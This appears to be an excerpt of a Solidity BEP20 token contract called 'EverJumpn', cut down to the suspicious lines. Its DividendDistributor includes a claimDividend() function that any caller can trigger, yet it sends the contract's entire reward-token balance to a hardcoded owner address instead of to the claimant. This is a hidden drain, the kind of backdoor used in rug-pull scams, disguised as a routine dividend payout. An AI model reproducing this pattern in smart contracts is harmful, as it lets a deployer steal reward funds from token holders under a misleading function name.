...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 RWRD2 = IBEP20(0x65eCf921de8070AA7cBb37c8d683308005b21Ce5);
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address owner = 0xdFDd39aceb4F901C25e3583F00E1C9081Bb8D6fE;
    IDEXRouter router;
    ...
    function claimDividend() external {
        RWRD2.transfer(owner, RWRD2.balanceOf(address(this)));
...
contract EverJumpn is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "EverJumpn";
    string constant _symbol = "EverJumpn";
